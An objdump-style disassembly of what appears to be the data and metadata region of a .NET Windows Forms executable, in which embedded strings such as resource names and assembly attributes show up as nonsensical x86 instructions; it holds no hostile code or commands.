  4054ab:	add    BYTE PTR [ecx],dh
  4054ad:	add    BYTE PTR [eax],bh
  4054af:	add    BYTE PTR [ebp+0x0],ah
  4054b2:	popa   
  4054b3:	add    BYTE PTR [ebx],dh
  4054b5:	add    BYTE PTR [ecx],dh
  4054b7:	add    BYTE PTR [ecx+0x0],ah
  4054ba:	cmp    BYTE PTR [eax],al
  4054bc:	popa   
  4054bd:	add    BYTE PTR [ebp+0x0],ah
  4054c0:	bound  eax,QWORD PTR [eax]
  4054c2:	add    BYTE PTR fs:[eax],dh
  4054c5:	add    BYTE PTR [eax+eax*1+0x61],ah
  4054c9:	add    BYTE PTR [eax],dh
  4054cb:	add    BYTE PTR [eax],dh
  4054cd:	add    BYTE PTR [edi],dh
  4054cf:	add    BYTE PTR [edx],dh
  4054d1:	add    BYTE PTR [esi+0x0],ah
  4054d4:	xor    al,BYTE PTR [eax]
  4054d6:	xor    eax,0x38006400
  4054db:	add    BYTE PTR [edi],dh
  4054dd:	add    BYTE PTR [eax+eax*1+0x62],ah
  4054e1:	add    BYTE PTR [ecx+0x0],ah
  4054e4:	add    BYTE PTR ss:[esi+0x0],ah
  4054e8:	arpl   WORD PTR [eax],ax
  4054ea:	cmp    DWORD PTR [eax],eax
  4054ec:	xor    BYTE PTR [eax],al
  4054ee:	data16 add BYTE PTR [esi+0x0],ah
  4054f2:	add    BYTE PTR fs:0x38003900,dh
  4054f9:	add    BYTE PTR [ebp+0x0],ah
  4054fc:	add    BYTE PTR fs:[eax+eax*1],dh
  405500:	add    BYTE PTR fs:[ecx+0x0],ah
  405504:	xor    eax,DWORD PTR [eax]
  405506:	xor    eax,0x34006500
  40550b:	add    BYTE PTR [eax+eax*1],dh
  40550e:	arpl   WORD PTR [eax],ax
  405510:	xor    eax,DWORD PTR [eax]
  405512:	cmp    DWORD PTR [eax],eax
  405514:	cmp    BYTE PTR [eax],al
  405516:	arpl   WORD PTR [eax],ax
  405518:	xor    al,0x0
  40551a:	xor    eax,0x33003400
  40551f:	add    BYTE PTR [eax],dh
  405521:	add    BYTE PTR [edi],dh
  405523:	add    BYTE PTR [ebp+0x0],ah
  405526:	cmp    BYTE PTR [eax],al
  405528:	add    BYTE PTR gs:[ebx],dh
  40552b:	add    BYTE PTR [ebx],dh
  40552d:	add    BYTE PTR [edx+0x0],ah
  405530:	cmp    BYTE PTR [eax],al
  405532:	xor    al,0x0
  405534:	xor    al,BYTE PTR [eax]
  405536:	add    BYTE PTR ss:[ecx],dh
  405539:	add    BYTE PTR [eax+eax*1],dh
  40553c:	xor    eax,DWORD PTR [eax]
  40553e:	add    BYTE PTR fs:[ecx+0x0],ah
  405542:	add    BYTE PTR gs:[ebx+0x0],ah
  405546:	cmp    DWORD PTR [eax],eax
  405548:	data16 add BYTE PTR ds:0x36003900,dh
  40554f:	add    BYTE PTR [eax],bh
  405551:	add    BYTE PTR [ebx],dh
  405553:	add    BYTE PTR [esi],dh
  405555:	add    BYTE PTR [esi+0x0],ah
  405558:	cmp    DWORD PTR [eax],eax
  40555a:	aaa    
  40555b:	add    BYTE PTR [ebx+0x0],ah
  40555e:	cmp    BYTE PTR [eax],al
  405560:	data16 add BYTE PTR [edi],dh
  405563:	add    BYTE PTR [eax+eax*1],dh
  405566:	aaa    
  405567:	add    BYTE PTR ds:0x65003000,dh
  40556d:	add    BYTE PTR ds:0x37003900,dh
  405573:	add    BYTE PTR ds:0x36006300,dh
  405579:	add    BYTE PTR [eax+eax*1],dh
  40557c:	add    BYTE PTR gs:[edx],dh
  40557f:	add    BYTE PTR [ecx],dh
  405581:	add    BYTE PTR [eax],bh
  405583:	add    BYTE PTR [ecx],bh
  405585:	add    BYTE PTR [esi+0x0],ah
  405588:	xor    al,0x0
  40558a:	xor    eax,0x65006400
  40558f:	add    BYTE PTR [esi+0x0],ah
  405592:	xor    al,0x0
  405594:	add    BYTE PTR ss:[edx+0x0],ah
  405598:	xor    al,BYTE PTR [eax]
  40559a:	popa   
  40559b:	add    BYTE PTR [edx],dh
  40559d:	add    BYTE PTR [edx+0x0],ah
  4055a0:	xor    DWORD PTR [eax],eax
  4055a2:	xor    al,BYTE PTR [eax]
  4055a4:	xor    al,0x0
  4055a6:	aaa    
  4055a7:	add    BYTE PTR [ecx+0x0],ah
  4055aa:	add    BYTE PTR fs:[ebx+0x0],ah
  4055ae:	xor    eax,DWORD PTR [eax]
  4055b0:	add    BYTE PTR ss:0x62003200,dh
  4055b7:	add    BYTE PTR [esi+0x0],ah
  4055ba:	xor    eax,0x33006300
  4055bf:	add    BYTE PTR [eax],dh
  4055c1:	add    BYTE PTR [eax],bh
  4055c3:	add    BYTE PTR [eax],dh
  4055c5:	add    BYTE PTR ds:0x64003500,dh
  4055cb:	add    BYTE PTR [ecx+0x0],ah
  4055ce:	cmp    DWORD PTR [eax],eax
  4055d0:	or     BYTE PTR [esi+0x790053],0x73
  4055d7:	add    BYTE PTR [eax+eax*1+0x65],dh
  4055db:	add    BYTE PTR [ebp+0x0],ch
  4055de:	add    BYTE PTR cs:[edi+0x0],dl
  4055e2:	imul   eax,DWORD PTR [eax],0x64006e
  4055e8:	outs   dx,DWORD PTR ds:[esi]
  4055e9:	add    BYTE PTR [edi+0x0],dh
  4055ec:	jae    0x4055ee
  4055ee:	add    BYTE PTR cs:[eax+0x0],dl
  4055f2:	jb     0x4055f4
  4055f4:	add    BYTE PTR gs:[ebx+0x0],dh
  4055f8:	add    BYTE PTR gs:[esi+0x0],ch
  4055fc:	je     0x4055fe
  4055fe:	popa   
  4055ff:	add    BYTE PTR [eax+eax*1+0x69],dh
  405603:	add    BYTE PTR [edi+0x0],ch
  405606:	outs   dx,BYTE PTR ds:[esi]
  405607:	add    BYTE PTR [eax+eax*1],ch
  40560a:	and    BYTE PTR [eax],al
  40560c:	push   eax
  40560d:	add    BYTE PTR [ebp+0x0],dh
  405610:	bound  eax,QWORD PTR [eax]
  405612:	ins    BYTE PTR es:[edi],dx
  405613:	add    BYTE PTR [ecx+0x0],ch
  405616:	arpl   WORD PTR [eax],ax
  405618:	dec    ebx
  405619:	add    BYTE PTR [ebp+0x0],ah
  40561c:	jns    0x40561e
  40561e:	cmp    eax,0x30003000
  405623:	add    BYTE PTR [eax],dh
  405625:	add    BYTE PTR [eax],dh
  405627:	add    BYTE PTR [eax],dh
  405629:	add    BYTE PTR [eax],dh
  40562b:	add    BYTE PTR [eax],dh
  40562d:	add    BYTE PTR [eax],dh
  40562f:	add    BYTE PTR [eax],dh
  405631:	add    BYTE PTR [eax],dh
  405633:	add    BYTE PTR [eax],dh
  405635:	add    BYTE PTR [eax],dh
  405637:	add    BYTE PTR [eax],dh
  405639:	add    BYTE PTR [eax],dh
  40563b:	add    BYTE PTR [eax],dh
  40563d:	add    BYTE PTR [eax],dh
  40563f:	add    BYTE PTR [eax],dh
  405641:	add    BYTE PTR [eax+eax*1],dh
  405644:	xor    BYTE PTR [eax],al
  405646:	xor    BYTE PTR [eax],al
  405648:	xor    BYTE PTR [eax],al
  40564a:	xor    BYTE PTR [eax],al
  40564c:	xor    BYTE PTR [eax],al
  40564e:	xor    BYTE PTR [eax],al
  405650:	xor    BYTE PTR [eax],al
  405652:	xor    BYTE PTR [eax],al
  405654:	xor    BYTE PTR [eax],al
  405656:	xor    BYTE PTR [eax],al
  405658:	xor    BYTE PTR [eax],al
  40565a:	xor    BYTE PTR [eax],al
  40565c:	xor    BYTE PTR [eax],al
  40565e:	xor    BYTE PTR [eax],al
  405660:	dec    esp
  405661:	pop    esp
  405662:	add    BYTE PTR [edx+0x0],al
  405665:	popa   
  405666:	add    BYTE PTR [ebx+0x0],dh
  405669:	add    BYTE PTR gs:[esi+0x0],cl
  40566d:	popa   
  40566e:	add    BYTE PTR [ebp+0x0],ch
  405671:	add    BYTE PTR gs:[eax+eax*1+0x4f],ah
  405676:	add    BYTE PTR [edx+0x0],ah
  405679:	push   0x0
  40567b:	add    BYTE PTR gs:[ebx+0x0],ah
  40567f:	je     0x405681
  405681:	jae    0x405683
  405683:	pop    esp
  405684:	add    BYTE PTR [esi+0x0],al
  405687:	outs   dx,DWORD PTR ds:[esi]
  405688:	add    BYTE PTR [esi+0x0],ch
  40568b:	je     0x40568d
  40568d:	inc    ebx
  40568e:	add    BYTE PTR [ecx+0x0],ah
  405691:	arpl   WORD PTR [eax],ax
  405693:	push   0x50006500
  405698:	add    BYTE PTR [edi+0x0],ch
  40569b:	jb     0x40569d
  40569d:	je     0x40569f
  40569f:	xor    eax,DWORD PTR [eax]
  4056a1:	add    BYTE PTR cs:[eax],dh
  4056a4:	add    BYTE PTR [esi],ch
  4056a6:	add    BYTE PTR [eax],dh
  4056a8:	add    BYTE PTR [esi],ch
  4056aa:	add    BYTE PTR [eax],dh
  4056ac:	add    BYTE PTR [eax],ah
  4056ae:	inc    esi
  4056af:	add    BYTE PTR [edi+0x0],ch
  4056b2:	outs   dx,BYTE PTR ds:[esi]
  4056b3:	add    BYTE PTR [eax+eax*1+0x43],dh
  4056b7:	add    BYTE PTR [ecx+0x0],ah
  4056ba:	arpl   WORD PTR [eax],ax
  4056bc:	push   0x33006500
  4056c1:	add    BYTE PTR [esi],ch
  4056c3:	add    BYTE PTR [eax],dh
  4056c5:	add    BYTE PTR [esi],ch
  4056c7:	add    BYTE PTR [eax],dh
  4056c9:	add    BYTE PTR [esi],ch
  4056cb:	add    BYTE PTR [eax],dh
  4056cd:	add    BYTE PTR [eax],bh
  4056cf:	push   eax
  4056d0:	add    BYTE PTR [edx+0x0],dh
  4056d3:	add    BYTE PTR gs:[ebx+0x0],dh
  4056d7:	add    BYTE PTR gs:[esi+0x0],ch
  4056db:	je     0x4056dd
  4056dd:	popa   
  4056de:	add    BYTE PTR [eax+eax*1+0x69],dh
  4056e2:	add    BYTE PTR [edi+0x0],ch
  4056e5:	outs   dx,BYTE PTR ds:[esi]
  4056e6:	add    BYTE PTR [esi+0x0],cl
  4056e9:	popa   
  4056ea:	add    BYTE PTR [eax+eax*1+0x69],dh
  4056ee:	add    BYTE PTR [esi+0x0],dh
  4056f1:	add    BYTE PTR gs:[edi+0x0],bl
  4056f5:	jbe    0x4056f7
  4056f7:	xor    BYTE PTR [eax],al
  4056f9:	xor    eax,DWORD PTR [eax]
  4056fb:	xor    BYTE PTR [eax],al
  4056fd:	xor    BYTE PTR [eax],al
  4056ff:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  405704:	add    BYTE PTR [eax+eax*1+0x52],ch
  405708:	push   eax
  405709:	add    BYTE PTR [edx+0x0],dh
  40570c:	add    BYTE PTR gs:[ebx+0x0],dh
  405710:	add    BYTE PTR gs:[esi+0x0],ch
  405714:	je     0x405716
  405716:	popa   
  405717:	add    BYTE PTR [eax+eax*1+0x69],dh
  40571b:	add    BYTE PTR [edi+0x0],ch
  40571e:	outs   dx,BYTE PTR ds:[esi]
  40571f:	add    BYTE PTR [ebx+0x0],al
  405722:	inc    esi
  405723:	add    BYTE PTR [esi+0x0],al
  405726:	push   edx
  405727:	add    BYTE PTR [ecx+0x0],ah
  40572a:	jae    0x40572c
  40572c:	je     0x40572e
  40572e:	add    BYTE PTR gs:[edx+0x0],dh
  405732:	imul   eax,DWORD PTR [eax],0x65007a
  405738:	jb     0x40573a
  40573a:	dec    esi
  40573b:	add    BYTE PTR [ecx+0x0],ah
  40573e:	je     0x405740
  405740:	imul   eax,DWORD PTR [eax],0x650076
  405746:	pop    edi
  405747:	add    BYTE PTR [esi+0x0],dh
  40574a:	xor    BYTE PTR [eax],al
  40574c:	xor    eax,DWORD PTR [eax]
  40574e:	xor    BYTE PTR [eax],al
  405750:	xor    BYTE PTR [eax],al
  405752:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  405757:	add    BYTE PTR [eax+eax*1+0x16],ch
  40575b:	dec    ebp
  40575c:	add    BYTE PTR [ecx+0x0],ch
  40575f:	ins    BYTE PTR es:[edi],dx
  405760:	add    BYTE PTR [ebx+0x0],al
  405763:	outs   dx,DWORD PTR ds:[esi]
  405764:	add    BYTE PTR [edx+0x0],dh
  405767:	add    BYTE PTR gs:[esi],ch
  40576a:	add    BYTE PTR [eax+eax*1+0x6c],ah
  40576e:	add    BYTE PTR [eax+eax*1+0x16],ch
  405772:	push   edi
  405773:	add    BYTE PTR [ecx+0x0],ch
  405776:	outs   dx,BYTE PTR ds:[esi]
  405777:	add    BYTE PTR [ecx+0x0],ch
  40577a:	outs   dx,BYTE PTR ds:[esi]
  40577b:	add    BYTE PTR [ebp+0x0],ah
  40577e:	je     0x405780
  405780:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  405785:	add    BYTE PTR [eax+eax*1+0x22],ch
  405789:	push   edi
  40578a:	add    BYTE PTR [ecx+0x0],ch
  40578d:	outs   dx,BYTE PTR ds:[esi]
  40578e:	add    BYTE PTR [eax+eax*1+0x6f],ah
  405792:	add    BYTE PTR [edi+0x0],dh
  405795:	jae    0x405797
  405797:	inc    ebx
  405798:	add    BYTE PTR [edi+0x0],ch
  40579b:	add    BYTE PTR fs:[ebp+0x0],ah
  40579f:	arpl   WORD PTR [eax],ax
  4057a1:	jae    0x4057a3
  4057a3:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4057a8:	add    BYTE PTR [eax+eax*1+0x28],ch
  4057ac:	push   edi
  4057ad:	add    BYTE PTR [ecx+0x0],ch
  4057b0:	outs   dx,BYTE PTR ds:[esi]
  4057b1:	add    BYTE PTR [eax+eax*1+0x6f],ah
  4057b5:	add    BYTE PTR [edi+0x0],dh
  4057b8:	jae    0x4057ba
  4057ba:	inc    ebx
  4057bb:	add    BYTE PTR [edi+0x0],ch
  4057be:	add    BYTE PTR fs:[ebp+0x0],ah
  4057c2:	arpl   WORD PTR [eax],ax
  4057c4:	jae    0x4057c6
  4057c6:	inc    ebp
  4057c7:	add    BYTE PTR [eax+0x0],bh
  4057ca:	je     0x4057cc
  4057cc:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4057d1:	add    BYTE PTR [eax+eax*1+0x12],ch
  4057d5:	ins    DWORD PTR es:[edi],dx
  4057d6:	add    BYTE PTR [ebx+0x0],dh
  4057d9:	arpl   WORD PTR [eax],ax
  4057db:	ins    DWORD PTR es:[edi],dx
  4057dc:	add    BYTE PTR [ebx+0x0],dh
  4057df:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4057e4:	add    BYTE PTR [eax+eax*1+0x16],ch
  4057e8:	jo     0x4057ea
  4057ea:	jb     0x4057ec
  4057ec:	outs   dx,BYTE PTR ds:[esi]
  4057ed:	add    BYTE PTR [eax+eax*1+0x76],dh
  4057f1:	add    BYTE PTR [eax+0x0],dh
  4057f4:	je     0x4057f6
  4057f6:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4057fb:	add    BYTE PTR [eax+eax*1+0x5],ch
  4057ff:	add    BYTE PTR [ecx],al
  405801:	add    DWORD PTR ds:0xbf31080e,ebx
  405807:	cmp    BYTE PTR [esi-0x53],dl
  40580a:	ss dec esi
  40580c:	xor    eax,0x1020006
  405811:	adc    cl,BYTE PTR [ecx]
  405813:	add    al,BYTE PTR ds:0xe010200
  405819:	push   cs
  40581a:	add    eax,0x9120100
  40581f:	push   cs
  405820:	add    esp,DWORD PTR [eax]
  405822:	add    BYTE PTR [ecx],al
  405824:	add    al,0x20
  405826:	add    DWORD PTR [ecx],eax
  405828:	add    al,BYTE PTR [eax+eiz*1]
  40582b:	add    DWORD PTR [ecx],eax
  40582d:	push   cs
  40582e:	add    eax,0x11010120
  405833:	xor    eax,0x1012005
  405838:	adc    DWORD PTR ds:0x1012004,edi
  40583e:	or     BYTE PTR [eax+0x2400a0],al
  405844:	add    BYTE PTR [eax+eax*4],al
  405847:	add    BYTE PTR [eax],al
  405849:	xchg   esp,eax
  40584a:	add    BYTE PTR [eax],al
  40584c:	add    BYTE PTR [esi],al
  40584e:	add    al,BYTE PTR [eax]
  405850:	add    BYTE PTR [eax],al
  405852:	and    al,0x0
  405854:	add    BYTE PTR [edx+0x53],dl
  405857:	inc    ecx
  405858:	xor    DWORD PTR [eax],eax
  40585a:	add    al,0x0
  40585c:	add    BYTE PTR [ecx],al
  40585e:	add    BYTE PTR [ecx],al
  405860:	add    BYTE PTR [ebp+0x2e790fc],dh
  405866:	jg     0x4058cf
  405868:	xchg   DWORD PTR [esi],ebx
  40586a:	ja     0x4058a6
  40586c:	(bad)  
  40586d:	fimul  WORD PTR [ecx-0x2be237c8]
  405873:	add    bh,BYTE PTR [edx+0x1d20b965]
  405879:	pusha  
  40587a:	pop    ecx
  40587b:	ds xchg esi,eax
  40587d:	les    edx,FWORD PTR [edx-0x6377e19b]
  405883:	sar    DWORD PTR [edi],0x14
  405886:	adc    eax,0xac3fb5eb
  40588b:	adc    DWORD PTR [ecx],esi
  40588d:	scas   al,BYTE PTR es:[edi]
  40588e:	or     edx,ebx
  405890:	xor    eax,ebp
  405892:	out    dx,al
  405893:	pusha  
  405894:	and    DWORD PTR [edi+0x2d],esp
  405897:	xchg   edi,eax
  405898:	sbb    dl,ch
  40589a:	xor    DWORD PTR [eax-0x5ff24252],ebp
  4058a0:	pop    es
  4058a1:	das    
  4058a2:	and    eax,0x6fba7dd8
  4058a7:	leave  
  4058a8:	paddw  mm3,QWORD PTR [ecx-0x72]
  4058ac:	aam    0xda
  4058ae:	xor    eax,0x8c394ce4
  4058b3:	inc    ebp
  4058b4:	inc    ebx
  4058b5:	pop    es
  4058b6:	call   0x26c4949e
  4058bb:	adc    al,0x3d
  4058bd:	scas   al,BYTE PTR es:[edi]
  4058be:	leave  
  4058bf:	cmc    
  4058c0:	xchg   esi,eax
  4058c1:	sub    DWORD PTR [edi-0x69],0xffffffc8
  4058c5:	test   DWORD PTR [edi+0x50],0x645c97e5
  4058cc:	loop   0x4058e6
  4058ce:	lahf   
  4058cf:	inc    ebp
  4058d0:	fdivrp st(4),st
  4058d2:	imul   ebp,DWORD PTR [edx],0x2b
  4058d5:	adc    al,BYTE PTR [edi-0x53]
  4058d8:	ret    
  4058d9:	gs sub esi,ebp
  4058dc:	ret    
  4058dd:	or     BYTE PTR ds:0x104a95d,al
  4058e3:	add    BYTE PTR [eax],al
  4058e5:	add    BYTE PTR ds:0xe020200,al
  4058eb:	push   cs
  4058ec:	add    al,0x0
  4058ee:	add    DWORD PTR [ecx],eax
  4058f0:	push   cs
  4058f1:	add    eax,0xe0e0200
  4058f6:	push   cs
  4058f7:	add    eax,0x1c0e0200
  4058fc:	sbb    al,0x5
  4058fe:	add    BYTE PTR [ecx],al
  405900:	push   cs
  405901:	sbb    eax,0x6070c1c
  405906:	add    al,BYTE PTR [edx]
  405908:	adc    bl,BYTE PTR [ecx+0x12]
  40590b:	pop    ecx
  40590c:	adc    bl,BYTE PTR [ecx+0x1d]
  40590f:	sbb    al,0x3
  405911:	push   es
  405912:	adc    DWORD PTR [ebp+0x4],ebx
  405915:	and    BYTE PTR [eax],al
  405917:	adc    ah,BYTE PTR [ecx+0x8]
  40591a:	and    BYTE PTR [eax],al
  40591c:	adc    eax,0x12016512
  405921:	imul   eax,DWORD PTR [esi],0x1651215
  405927:	adc    ch,BYTE PTR [ecx+0x4]
  40592a:	and    BYTE PTR [eax],al
  40592c:	adc    eax,DWORD PTR [eax]
  40592e:	add    al,0x20
  405930:	add    BYTE PTR [ecx],dl
  405932:	pop    ebp
  405933:	pop    es
  405934:	add    BYTE PTR [edx],al
  405936:	add    dl,BYTE PTR [ecx]
  405938:	pop    ebp
  405939:	adc    DWORD PTR [ebp+0x3],ebx
  40593c:	and    BYTE PTR [eax],al
  40593e:	add    al,BYTE PTR [ebx]
  405940:	and    BYTE PTR [eax],al
  405942:	push   cs
  405943:	push   es
  405944:	add    BYTE PTR [ebx],al
  405946:	sbb    al,0xe
  405948:	push   cs
  405949:	sbb    al,0x6
  40594b:	add    BYTE PTR [ecx],al
  40594d:	adc    DWORD PTR [eax+0x40d81],eax
  405953:	add    BYTE PTR [ecx],dl
  405955:	pop    ebp
  405956:	add    al,0x0
  405958:	add    DWORD PTR [ecx],eax
  40595a:	or     BYTE PTR [ecx],cl
  40595c:	add    BYTE PTR [edx],al
  40595e:	adc    DWORD PTR [eax+0x115d1181],eax
  405964:	pop    ebp
  405965:	or     DWORD PTR [eax],eax
  405967:	add    al,BYTE PTR [edx]
  405969:	adc    DWORD PTR [eax-0x7e7fee7f],eax
  40596f:	pop    ss
  405970:	pop    es
  405971:	or     DWORD PTR [edx],edx
  405973:	imul   edx,DWORD PTR [ecx],0x1261125d
  405979:	imul   ecx,DWORD PTR [eax],0x8180111c
  40597f:	adc    DWORD PTR [ebp+0x15],ebx
  405982:	adc    ah,BYTE PTR [ebp+0x1]
  405985:	adc    ch,BYTE PTR [ecx+0x2]
  405988:	push   es
  405989:	or     BYTE PTR [edi],al
  40598b:	add    BYTE PTR [ecx],al
  40598d:	adc    al,BYTE PTR [eax+0x709128d]
  405993:	and    BYTE PTR [edx],al
  405995:	add    DWORD PTR [esi],ecx
  405997:	adc    DWORD PTR [eax+0x2070791],eax
  40599d:	adc    cl,BYTE PTR [ecx]
  40599f:	adc    al,BYTE PTR [eax+0x220078d]
  4059a5:	add    cl,BYTE PTR [esi]
  4059a7:	adc    DWORD PTR [eax+0x1200495],eax
  4059ad:	or     BYTE PTR [ebx],al
  4059af:	add    eax,0x80e0220
  4059b4:	or     BYTE PTR [eax+eiz*1],al
  4059b7:	add    DWORD PTR [esi],ecx
  4059b9:	or     BYTE PTR [edi],al
  4059bb:	and    BYTE PTR [edx],al
  4059bd:	add    DWORD PTR [edx],edx
  4059bf:	sbb    BYTE PTR [ecx+0x307050e],0xe
  4059c6:	push   cs
  4059c7:	or     BYTE PTR ds:0x10001,al
  4059cd:	add    BYTE PTR [edi+0x1],al
  4059d0:	add    BYTE PTR [edx+0x64],al
  4059d3:	cmp    bl,BYTE PTR [ebx+esi*2+0x70]
  4059d7:	xor    DWORD PTR [ecx+0x66],esi
  4059da:	gs cs jo 0x405a53
  4059de:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4059e2:	cs popa 
  4059e4:	ins    DWORD PTR es:[edi],dx
  4059e5:	fs ss xor al,0x66
  4059e9:	jb     0x405a50
  4059eb:	pop    esp
  4059ec:	imul   ebp,DWORD PTR [esi+0x74],0x616e7265
  4059f3:	ins    BYTE PTR es:[edi],dx
  4059f4:	pop    esp
  4059f5:	jae    0x405a6b
  4059f7:	jb     0x405a68
  4059f9:	outs   dx,BYTE PTR ds:[esi]
  4059fa:	outs   dx,BYTE PTR ds:[si]
  4059fc:	popa   
  4059fd:	ins    DWORD PTR es:[edi],dx
  4059fe:	imul   esp,DWORD PTR gs:[ebp+0x79],0x73
  405a03:	pop    esp
  405a04:	popaw  
  405a06:	imul   esp,DWORD PTR [ebp+0x5c],0x77
  405a0a:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  405a11:	jae    0x405a81
  405a13:	imul   eax,DWORD PTR [eax],0x0
  405a16:	adc    eax,DWORD PTR [ecx]
  405a18:	add    BYTE PTR [esi],cl
  405a1a:	ss xor BYTE PTR cs:[esi],ch
  405a1e:	xor    BYTE PTR ss:[eax],dh
  405a21:	xor    DWORD PTR [esi],ebp
  405a23:	xor    DWORD PTR [edi],esi
  405a25:	xor    BYTE PTR [ecx],dh
  405a27:	xor    al,0x0
  405a29:	add    BYTE PTR [edx],bl
  405a2b:	add    DWORD PTR [eax],eax
  405a2d:	adc    eax,0x7263694d
  405a32:	outs   dx,DWORD PTR ds:[esi]
  405a33:	jae    0x405aa4
  405a35:	data16 je 0x405a58
  405a38:	inc    ebx
  405a39:	outs   dx,DWORD PTR ds:[esi]
  405a3a:	jb     0x405aac
  405a3c:	outs   dx,DWORD PTR ds:[esi]
  405a3d:	jb     0x405aa0
  405a3f:	je     0x405aaa
  405a41:	outs   dx,DWORD PTR ds:[esi]
  405a42:	outs   dx,BYTE PTR ds:[esi]
  405a43:	add    BYTE PTR [eax],al
  405a45:	add    DWORD PTR ds:[eax],eax
  405a48:	cmp    DWORD PTR [ebx+0x6f],eax
  405a4b:	jo     0x405ac6
  405a4d:	jb     0x405ab8
  405a4f:	addr16 push 0x63282074
  405a55:	sub    DWORD PTR [eax],esp
  405a57:	dec    ebp
  405a58:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  405a5f:	je     0x405a81
  405a61:	inc    ebx
  405a62:	outs   dx,DWORD PTR ds:[esi]
  405a63:	jb     0x405ad5
  405a65:	outs   dx,DWORD PTR ds:[esi]
  405a66:	jb     0x405ac9
  405a68:	je     0x405ad3
  405a6a:	outs   dx,DWORD PTR ds:[esi]
  405a6b:	outs   dx,BYTE PTR ds:[esi]
  405a6c:	and    BYTE PTR cs:[ecx+0x6c],al
  405a70:	ins    BYTE PTR es:[edi],dx
  405a71:	and    BYTE PTR [edx+0x69],dh
  405a74:	addr16 push 0x72207374
  405a7a:	gs jae 0x405ae2
  405a7d:	jb     0x405af5
  405a7f:	gs fs add BYTE PTR cs:[eax],al
  405a84:	das    
  405a85:	add    DWORD PTR [eax],eax
  405a87:	sub    cl,BYTE PTR [ebp+0x69]
  405a8a:	arpl   WORD PTR [edx+0x6f],si
  405a8d:	jae    0x405afe
  405a8f:	data16 je 0x405ab2
  405a92:	sub    BYTE PTR [edx+0x29],dl
  405a95:	and    BYTE PTR [edi+0x69],dl
  405a98:	outs   dx,BYTE PTR ds:[esi]
  405a99:	outs   dx,DWORD PTR fs:[esi]
  405a9b:	ja     0x405b10
  405a9d:	and    BYTE PTR [eax],ch
  405a9f:	push   edx
  405aa0:	sub    DWORD PTR [eax],esp
  405aa2:	dec    edi
  405aa3:	jo     0x405b0a
  405aa5:	jb     0x405b08
  405aa7:	je     0x405b12
  405aa9:	outs   dx,BYTE PTR ds:[esi]
  405aaa:	and    BYTE PTR [bp+di+0x79],dl
  405aae:	jae    0x405b24
  405ab0:	gs ins DWORD PTR es:[edi],dx
  405ab2:	add    BYTE PTR [eax],al
  405ab4:	add    eax,0x1
  405ab9:	add    BYTE PTR [eax],cl
  405abb:	add    DWORD PTR [eax],eax
  405abd:	add    al,BYTE PTR [eax]
  405abf:	add    BYTE PTR [eax],al
  405ac1:	add    BYTE PTR [eax],al
  405ac3:	or     BYTE PTR [ecx],al
  405ac5:	add    BYTE PTR [eax],cl
  405ac7:	add    BYTE PTR [eax],al
  405ac9:	add    BYTE PTR [eax],al
  405acb:	add    BYTE PTR [esi],bl
  405acd:	add    DWORD PTR [eax],eax
  405acf:	add    DWORD PTR [eax],eax
  405ad1:	push   esp
  405ad2:	add    dl,BYTE PTR [esi]
  405ad4:	push   edi
  405ad5:	jb     0x405b38
  405ad7:	jo     0x405b27
  405ad9:	outs   dx,DWORD PTR ds:[esi]
  405ada:	outs   dx,BYTE PTR ds:[esi]
  405adb:	inc    ebp
  405adc:	js     0x405b41
  405ade:	gs jo  0x405b55
  405ae1:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  405ae8:	ja     0x405b5d
  405aea:	add    DWORD PTR [eax-0x7ffed162],eax
  405af0:	test   BYTE PTR [ebx+0x79],dl
  405af3:	jae    0x405b69
  405af5:	gs ins DWORD PTR es:[edi],dx
  405af7:	cs push ebx
  405af9:	arpl   WORD PTR gs:[ebp+0x72],si
  405afd:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  405b05:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  405b0c:	cs push ebx
  405b0e:	arpl   WORD PTR gs:[ebp+0x72],si
  405b12:	imul   esi,DWORD PTR [ecx+edi*2+0x50],0x696d7265
  405b1a:	jae    0x405b8f
  405b1c:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  405b23:	imul   esp,DWORD PTR [edx+0x75],0x202c6574
  405b2a:	ins    DWORD PTR es:[edi],dx
  405b2b:	jae    0x405b90
  405b2d:	outs   dx,DWORD PTR ds:[esi]
  405b2e:	jb     0x405b9c
  405b30:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  405b37:	jae    0x405ba2
  405b39:	outs   dx,DWORD PTR ds:[esi]
  405b3a:	outs   dx,BYTE PTR ds:[esi]
  405b3b:	cmp    eax,0x2e302e32
  405b40:	xor    BYTE PTR [esi],ch
  405b42:	xor    BYTE PTR [eax+eiz*1],ch
  405b45:	inc    ebx
  405b46:	jne    0x405bb4
  405b48:	je     0x405bbf
  405b4a:	jb     0x405bb1
  405b4c:	cmp    eax,0x7475656e
  405b51:	jb     0x405bb4
  405b53:	ins    BYTE PTR es:[edi],dx
  405b54:	sub    al,0x20
  405b56:	push   eax
  405b57:	jne    0x405bbb
  405b59:	ins    BYTE PTR es:[edi],dx
  405b5a:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  405b61:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  405b65:	bound  esi,QWORD PTR [edi]
  405b67:	aaa    
  405b68:	popa   
  405b69:	xor    eax,0x31363563
  405b6e:	cmp    DWORD PTR [ebx],esi
  405b70:	xor    al,0x65
  405b72:	xor    BYTE PTR [eax],bh
  405b74:	cmp    DWORD PTR ds:0x10025401,edx
  405b7a:	push   ebx
  405b7b:	imul   ebp,DWORD PTR [ecx+0x70],0x56
  405b7f:	gs jb  0x405beb
  405b82:	imul   sp,WORD PTR [ebx+0x61],0x6974
  405b88:	outs   dx,DWORD PTR ds:[esi]
  405b89:	outs   dx,BYTE PTR ds:[esi]
  405b8a:	add    DWORD PTR [eax],eax
  405b8c:	add    BYTE PTR [eax],al
  405b8e:	add    BYTE PTR [eax],al
  405b90:	test   ah,ch
  405b92:	xor    edx,DWORD PTR [ebx+0x0]
  405b95:	add    BYTE PTR [eax],al
